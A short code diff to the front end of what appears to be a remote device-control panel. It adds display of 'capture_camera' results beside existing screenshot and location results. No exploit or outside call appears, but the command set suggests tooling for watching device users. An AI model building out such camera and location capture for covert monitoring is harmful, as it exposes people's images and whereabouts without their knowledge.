@@ -225,9 +225,15 @@
             const commandType = result.command_type;
             const resultData = result.result || {};
 
+            // Add support for camera captures alongside screenshots
             if (commandType === 'capture_screenshot' && resultData.image_data) {
                 return `<img src="data:image/jpeg;base64,${resultData.image_data}" style="max-width: 100%; max-height: 300px;" />`;
-            } else if (commandType === 'get_location' && resultData.latitude && resultData.longitude) {
+            }
+            // Add this case to handle camera captures
+            else if (commandType === 'capture_camera' && resultData.image_data) {
+                return `<img src="data:image/jpeg;base64,${resultData.image_data}" style="max-width: 100%; max-height: 300px;" />`;
+            }
+            else if (commandType === 'get_location' && resultData.latitude && resultData.longitude) {
                 const mapUrl = resultData.map_url || `https://maps.google.com/?q=${resultData.latitude},${resultData.longitude}`;
                 return `
                     <p>Latitude: ${resultData.latitude}</p>
